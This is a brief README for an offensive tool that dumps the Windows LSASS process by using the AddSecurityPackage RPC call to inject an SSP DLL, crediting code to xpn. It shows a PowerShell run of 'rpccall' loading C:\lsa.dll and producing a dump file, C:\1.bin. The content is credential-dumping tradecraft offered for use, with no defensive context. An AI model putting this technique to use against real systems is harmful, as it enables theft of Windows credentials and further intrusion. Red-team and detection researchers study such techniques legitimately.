# dump-lsass-via-rpc-addssp

Code from [xpn](https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e)

Use module `rpccall` (`AddSecurityPackage` RPC call) to add(inject) SSP DLL

```
PS C:\> .\rpccall C:\lsa.dll

AddSecurityPackage Raw RPC Example... by @_xpn_

[*] Building RPC packet
[*] Connecting to lsasspirpc RPC service
[*] Sending SspirConnectRpc call
[*] Sending SspirCallRpc call
[*] Error code 0x6c6 returned, which is expected if DLL load returns FALSE
PS C:\> ls C:\1.bin
1.bin
```

